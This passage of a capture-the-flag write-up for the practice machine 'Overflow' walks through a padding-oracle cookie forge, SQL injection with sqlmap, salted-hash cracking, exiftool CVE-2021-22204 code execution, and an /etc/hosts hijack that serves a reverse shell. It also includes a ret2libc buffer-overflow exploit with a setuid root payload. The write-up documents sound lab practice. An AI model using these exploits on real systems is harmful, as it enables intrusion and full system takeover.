</pre></td><td class="rouge-code"><pre>padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 <span class="nt">-cookies</span> <span class="s2">"auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72"</span> <span class="nt">-plaintext</span> <span class="s2">"user=admin"</span> <span class="nt">-verbose</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/20220219081330.png" alt="" data-proofer-ignore></p>

<p>Loading the homepage using this cookie, I noticed two new links in the homepage;</p>

<p><img data-src="/assets/img/20220219081749.png" alt="" data-proofer-ignore></p>

<p>Clicking on <code class="language-plaintext highlighter-rouge">Logs</code> just gave me a little popup;</p>

<p><img data-src="/assets/img/20220219081834.png" alt="" data-proofer-ignore></p>

<p>Clicking the <code class="language-plaintext highlighter-rouge">Admin panel</code>, I was presented with a login form;</p>

<p><img data-src="/assets/img/20220219082100.png" alt="" data-proofer-ignore></p>

<p>Trying some common defaults for the login didn’t work. Checking burp to see how the <code class="language-plaintext highlighter-rouge">/home/logs.php</code> works, I noticed that it passes a GET parameter <code class="language-plaintext highlighter-rouge">name</code> with the value set to <code class="language-plaintext highlighter-rouge">admin</code>. Adding a single quote to test for <em>SQL Injection</em> gave a <strong>500 Internal Server Error</strong>. So I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, and it turns out to be vulnerable;</p>

<p><img data-src="/assets/img/20220219084125.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="sql-injection">SQL Injection<a href="#sql-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>Available databases;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow
</pre></td></tr></tbody></table></code></div></div>

<p>Tables for <code class="language-plaintext highlighter-rouge">cmsmsdb</code>;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>Database: cmsmsdb
[47 tables]
+-----------------------------+
| cms_additional_users        |
---[snip]---
| cms_user_groups             |
| cms_userplugins             |
| cms_userplugins_seq         |
| cms_userprefs               |
| cms_users                   |
| cms_users_seq               |
| cms_version                 |
+-----------------------------+
</pre></td></tr></tbody></table></code></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">cms_users</code> contains two hashes;</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>EMAIL</th>
      <th>USERNAME</th>
      <th>PASSWORD</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>admin@overflow.htb</td>
      <td>admin</td>
      <td>c6c6b9310e0e6f3eb3ffeb2baff12fdd</td>
    </tr>
    <tr>
      <td> </td>
      <td>editor</td>
      <td>e3d748d58b58657bfa4dffe2def0b1c7</td>
    </tr>
  </tbody>
</table></div>

<p>Feeding these 2 hashes to <code class="language-plaintext highlighter-rouge">john</code>, I was unable to crack any using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the <code class="language-plaintext highlighter-rouge">--file-read</code> flag of <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if I can read local files, and I couldn’t.</p>

<p>I dumped the whole database using <code class="language-plaintext highlighter-rouge">sqlmap</code> and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by <code class="language-plaintext highlighter-rouge">sqlmap</code>, I found one;</p>

<p><img data-src="/assets/img/20220219114511.png" alt="" data-proofer-ignore></p>

<p>Going to the page, I got another login form;</p>

<p><img data-src="/assets/img/20220219114720.png" alt="" data-proofer-ignore></p>

<p>After a lot of digging, I found a hex-encoded string that could be a salt in the table <code class="language-plaintext highlighter-rouge">cms_siteprefs</code>(<em>mask</em> is another name for a salt);</p>

<p><img data-src="/assets/img/20220219115141.png" alt="" data-proofer-ignore></p>

<p>I was unable to get <code class="language-plaintext highlighter-rouge">john</code> to work with the hash, so I wrote a simple script;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Usage: %s &lt;hash&gt; &lt;salt&gt; &lt;wordlist&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Invalid wordlist: "</span> <span class="o">+</span> <span class="n">wordlist</span><span class="p">)</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Bruteforcing hash..."</span><span class="p">);</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">word</span><span class="p">:</span> <span class="c1"># Wordlist exhausted.
</span>    <span class="k">break</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
  <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">salt</span> <span class="o">+</span> <span class="n">word</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Success: "</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[-] Unable to crack!"</span><span class="p">)</span>
<span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I saved the above as <code class="language-plaintext highlighter-rouge">md5-salt-brute.py</code>, and ran it. I was able to crack the hash of the user <strong>editor</strong>;</p>

<div class="language-bash highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span><span class="nb">cat </span>hashes.john    
admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   
editor:e3d748d58b58657bfa4dffe2def0b1c7
admin<span class="o">(</span>overflow<span class="o">)</span>:c71d60439ed5590b3c5e99d95ed48165
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...                   
<span class="o">[</span>-] Unable to crack!                
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...        
<span class="o">[</span>+] Success: alpha!@#<span class="nv">$%</span>bravo                 
agent47@debian:<span class="err">$</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This is the only hash I could crack, but it gave me access to <strong>devbuild-job.overflow.htb</strong>;</p>

<p><img data-src="/assets/img/20220219124740.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="devbuild-joboverflowhtb">devbuild-job.overflow.htb<a href="#devbuild-joboverflowhtb" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>Almost all the links in the dashboard are dead. The profile page has a form that allows users to upload a <em>resume</em>;</p>

<p><img data-src="/assets/img/20220223084146.png" alt="" data-proofer-ignore></p>

<p>Uploading a .png file, which is not part of the listed formats, gave a <strong>File Type Not supported</strong> error that appeared only briefly.</p>

<p>Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of <code class="language-plaintext highlighter-rouge">exiftool</code>, along with the path the files are uploaded to;</p>

<p><img data-src="/assets/img/20220223085028.png" alt="" data-proofer-ignore></p>

<p>Exiftool has an RCE vulnerability tracked as <strong>CVE-2021-22204</strong>, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as <strong>www-data</strong>;</p>

<p><img data-src="/assets/img/20220223085941.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="user">User<a href="#user" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>Inside the box as <strong>www-data</strong>, I found two local users; <strong>developer</strong>, and <strong>tester</strong>. The user <strong>tester</strong> is the one that hold the user flag. The configuration files of the site <strong>devbuild-job.overflow.htb</strong> has a MySQL credential;</p>

<p><img data-src="/assets/img/20220223090438.png" alt="" data-proofer-ignore></p>

<p>The password is not reused by any of the local users. The main site <strong>overflow.htb</strong> also has a MySQL credential;</p>

<p><img data-src="/assets/img/20220223090806.png" alt="" data-proofer-ignore></p>

<p>Testing this password against the local user account of <strong>developer</strong> worked, and I was able to login over SSH;</p>

<p><img data-src="/assets/img/20220223091047.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="developer">Developer<a href="#developer" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>The user does not have any <code class="language-plaintext highlighter-rouge">sudo</code> permissions, but they belong to a group called <strong>network</strong>. Searching for files that belong to this group, I got one very interesting match;</p>

<p><img data-src="/assets/img/20220223092838.png" alt="" data-proofer-ignore></p>

<p>I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that the hostname resolves to an address I control.</p>

<p>So I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the box, and it picked up a download using <code class="language-plaintext highlighter-rouge">curl</code> for a shell script on the site <strong>taskmanage.overflow.htb</strong>;</p>

<p><img data-src="/assets/img/20220223094110.png" alt="" data-proofer-ignore></p>

<p>So I created a file named <code class="language-plaintext highlighter-rouge">task.sh</code> with a reverse shell payload on my box, and hosted it using python’s <code class="language-plaintext highlighter-rouge">http.server</code> module. I then edited the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the box and mapped the domain <strong>taskmanage.overflow.htb</strong> to my IP;</p>

<p><img data-src="/assets/img/20220223094534.png" alt="" data-proofer-ignore></p>

<p>After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as <strong>tester</strong>;</p>

<p><img data-src="/assets/img/20220223094835.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc<a href="#privesc" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>I cannot view <code class="language-plaintext highlighter-rouge">sudo</code> permission for the user <strong>tester</strong> as I still don’t have their password, and the user does not belong to any other group.</p>

<p>Going through the filesystem, I found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt</code>;</p>

<p><img data-src="/assets/img/20220223095648.png" alt="" data-proofer-ignore></p>

<p>Running the binary, I was prompted for a PIN;</p>

<p><img data-src="/assets/img/20220223095808.png" alt="" data-proofer-ignore></p>

<p>So I shipped the binary to my attack box for analysis.</p>

<p><br /></p>

<h4 id="analysis-file_encrypt">Analysis: file_encrypt<a href="#analysis-file_encrypt" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<div class="language-shell highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span>rabin2 <span class="nt">-I</span> file_encrypt 
<span class="nb">arch     </span>x86
baddr    0x0
binsz    10741
bintype  elf
bits     32
canary   <span class="nb">false
</span>class    ELF32
compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
crypto   <span class="nb">false
</span>endian   little
havecode <span class="nb">true
</span>intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  <span class="nb">true
</span>lsyms    <span class="nb">true
</span>machine  Intel 80386
nx       <span class="nb">true
</span>os       linux
pic      <span class="nb">true
</span>relocs   <span class="nb">true
</span>relro    full
rpath    NONE
sanitize <span class="nb">false
</span>static   <span class="nb">false
</span>stripped <span class="nb">false
</span>subsys   linux
va       <span class="nb">true</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">main</code> function is calling <code class="language-plaintext highlighter-rouge">check_pin()</code>, which is likely the function doing PIN validation;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>[0x00000b62]&gt; pdf
╭ 46: int main (char **argv);
│           ; arg char **argv @ esp+0x14
│           0x00000b62      8d4c2404       lea ecx, [argv]
│           0x00000b66      83e4f0         and esp, 0xfffffff0
│           0x00000b69      ff71fc         push dword [ecx - 4]
│           0x00000b6c      55             push ebp
│           0x00000b6d      89e5           mov ebp, esp
│           0x00000b6f      51             push ecx
│           0x00000b70      83ec04         sub esp, 4
│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax
│           0x00000b78      0528240000     add eax, 0x2428
│           0x00000b7d      e82effffff     call sym.check_pin
│           0x00000b82      b800000000     mov eax, 0
│           0x00000b87      83c404         add esp, 4
│           0x00000b8a      59             pop ecx
│           0x00000b8b      5d             pop ebp
│           0x00000b8c      8d61fc         lea esp, [ecx - 4]
╰           0x00000b8f      c3             ret
[0x00000b62]&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Disassembly of <code class="language-plaintext highlighter-rouge">sym.check_pin</code>;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre>[0x56602ab0]&gt; pdf                                                                                                                     
            ; CALL XREF from main @ 0x56602b7d
╭ 178: sym.check_pin ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_14h @ ebp-0x14                                                                                          
│           ; var uint32_t var_10h @ ebp-0x10                                                                                         
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x56602ab0      55             push ebp
│           0x56602ab1      89e5           mov ebp, esp
│           0x56602ab3      53             push ebx
│           0x56602ab4      83ec24         sub esp, 0x24                                                                              
│           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             
│           0x56602abc      81c3e4240000   add ebx, 0x24e4
│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               
│           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 
│           0x56602aca      83ec0c         sub esp, 0xc                                                                               
│           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     
│           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        
│           0x56602ad5      83c410         add esp, 0x10
│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                
│           0x56602adb      83ec08         sub esp, 8
│           0x56602ade      ff75f4         push dword [ebp - 0xc]
│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    
│           0x56602ae7      50             push eax                    ; const char *format                                           
│           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               
│           0x56602aed      83c410         add esp, 0x10
│           0x56602af0      83ec08         sub esp, 8
│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]
│           0x56602af6      50             push eax
│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]
│           0x56602afd      50             push eax                    ; const char *format
│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x56602b03      83c410         add esp, 0x10
│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]
│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax
│       ╭─&lt; 0x56602b0c      753c           jne 0x56602b4a
│       │   0x56602b0e      83ec0c         sub esp, 0xc
│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]
│       │   0x56602b17      50             push eax                    ; const char *format
│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x56602b1d      83c410         add esp, 0x10
│       │   0x56602b20      83ec08         sub esp, 8
│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]
│       │   0x56602b26      50             push eax
│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]
│       │   0x56602b2d      50             push eax                    ; const char *format
│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│       │   0x56602b33      83c410         add esp, 0x10
│       │   0x56602b36      83ec0c         sub esp, 0xc
│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]
│       │   0x56602b3f      50             push eax                    ; const char *s
│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x56602b45      83c410         add esp, 0x10
│      ╭──&lt; 0x56602b48      eb12           jmp 0x56602b5c
│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c
│      │╰─&gt; 0x56602b4a      83ec0c         sub esp, 0xc
│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]
│      │    0x56602b53      50             push eax                    ; const char *s
│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x56602b59      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.check_pin @ 0x56602b48
│      ╰──&gt; 0x56602b5c      90             nop
│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]
│           0x56602b60      c9             leave
╰           0x56602b61      c3             ret
[0x56602ab0]&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>There are multiple calls to <code class="language-plaintext highlighter-rouge">scanf()</code>, which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to <code class="language-plaintext highlighter-rouge">scanf()</code> at <code class="language-plaintext highlighter-rouge">0x56635b03</code>. The instruction at <code class="language-plaintext highlighter-rouge">0x56635b09</code> compares the value of <code class="language-plaintext highlighter-rouge">eax</code> (which is where the PIN we entered is stored), with the value in <code class="language-plaintext highlighter-rouge">var_10h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x10</code>);</p>

<p><img data-src="/assets/img/20220223104118.png" alt="" data-proofer-ignore></p>

<p>Since the comparison is with <code class="language-plaintext highlighter-rouge">eax</code>, which is a 32 bit register, I read 4 bytes from the other operand, which gave <code class="language-plaintext highlighter-rouge">0xf3e6d338</code>. Converting this to 32 bit signed integer, I got <code class="language-plaintext highlighter-rouge">-202976456</code>;</p>

<p><img data-src="/assets/img/20220223104835.png" alt="" data-proofer-ignore></p>

<p>This value is the valid PIN, and it was accepted by the binary;</p>

<p><img data-src="/assets/img/20220223105044.png" alt="" data-proofer-ignore></p>

<p>After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the <strong>name</strong> could be vulnerable to <em>buffer overflow</em>. The name read is stored at <code class="language-plaintext highlighter-rouge">var_28h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x28</code>);</p>

<p><img data-src="/assets/img/20220223111120.png" alt="" data-proofer-ignore></p>

<p>A memory address in x86 is 32 bit. Since the destination address is 40 bytes (<code class="language-plaintext highlighter-rouge">0x28</code>) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of <code class="language-plaintext highlighter-rouge">main()</code> (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in <code class="language-plaintext highlighter-rouge">gdb</code>, it worked as expected. The binary is vulnerable to <em>buffer overflow</em> attack;</p>

<p><img data-src="/assets/img/20220223111853.png" alt="" data-proofer-ignore></p>

<p>And it gets better too, because ASLR is disabled on the box;</p>

<p><img data-src="/assets/img/20220223203858.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="exploitation-ret2libc">Exploitation: ret2libc<a href="#exploitation-ret2libc" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>The binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is <strong>return to libc</strong> (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">execv</code>), and passing it an argument we control (like the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in the libc library). This works because no code is executed on the stack.</p>

<p>To exploit this, I need to write <strong>44</strong> bytes of padding, followed by the address of <code class="language-plaintext highlighter-rouge">execv()</code> to overwrite the EIP. followed by the address of <code class="language-plaintext highlighter-rouge">exit()</code> which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used <code class="language-plaintext highlighter-rouge">execv()</code> because unlike <code class="language-plaintext highlighter-rouge">system()</code>, it does not drop privileges when spawning a new process.</p>

<p>The first step is figuring out the address of <code class="language-plaintext highlighter-rouge">execv()</code>, <code class="language-plaintext highlighter-rouge">exit()</code>, and the environment variable <code class="language-plaintext highlighter-rouge">PAYLOAD</code> (which I set to the path of my reverse shell). For this, I wrote a simple C program;</p>

<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(){

  printf("Addr of system():   0x%08x\n", &amp;execv);
  printf("Addr of exit():     0x%08x\n", &amp;exit);
  printf("Addr of $PAYLOAD:   0x%08x\n", getenv("PAYLOAD"));
  
  return 0;
}
</code></pre>

<p>Notice how the address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> changes based on the length of the filename;</p>

<p><img data-src="/assets/img/20220225070759.png" alt="" data-proofer-ignore></p>

<p>We need to account for this when calling the binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. Since it is 30 characters long, I renamed the address dumper to <code class="language-plaintext highlighter-rouge">/dev/shm/dump_addrssssssssssss</code>. This will give me the correct address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> when calling <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. We now have our valid addresses;</p>

<p><img data-src="/assets/img/20220225070932.png" alt="" data-proofer-ignore></p>

<p>Using python, I built a simple <em>ret2libc</em> payload;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">44</span>

<span class="n">execv</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7ea8730</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7e194b0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xffffdf44</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"-202976456"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">execv</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">payload</span>

</pre></td></tr></tbody></table></code></div></div>

<p>I generated the buffer and saved it in my web directory;</p>

<p><img data-src="/assets/img/20220225071253.png" alt="" data-proofer-ignore></p>

<p>On the remote host, I set <code class="language-plaintext highlighter-rouge">PAYLOAD</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;</p>

<p><img data-src="/assets/img/20220225071317.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220225071333.png" alt="" data-proofer-ignore></p>

<p>So I wrote a simple C payload that will elevate to higher privileges using <code class="language-plaintext highlighter-rouge">setuid()</code> and <code class="language-plaintext highlighter-rouge">setgid()</code> before calling my reverse shell;</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){

  setuid(0);
  setgid(0);
  char *args[] = {"revshell.sh", NULL};
  execv("/dev/shm/revshell.sh", args);
  return 0;
}
</code></pre>

<p>I compiled and pushed the program to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, which is the value in my <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> variable. Running the exploit again, I got a shell on the box as <strong>root</strong>;</p>

<p><img data-src="/assets/img/20220225072928.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary<a href="#summary" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>25</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an open signup on the website, and created a test account.</li>
  <li>Identified a possible username <strong>admin</strong> that exist on the website.</li>
  <li>Used <em>Oracle Padding</em> attack to craft a cookie that gave access to the account of <strong>admin</strong>
    <ul>
      <li>Found an SQL injection vulnerability in <code class="language-plaintext highlighter-rouge">/home/logs.php</code></li>
      <li>Used <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump some hashes, and discovered the domain <strong>devbuild-job.overflow.htb</strong></li>
      <li>Gained access to the domain by cracking the salted hash of the user <strong>editor</strong></li>
    </ul>
  </li>
  <li><strong>devbuild-job.overflow.htb</strong>
    <ul>
      <li>Found a file upload form that is passed to <code class="language-plaintext highlighter-rouge">exiftool</code>.</li>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution as <strong>www-data</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
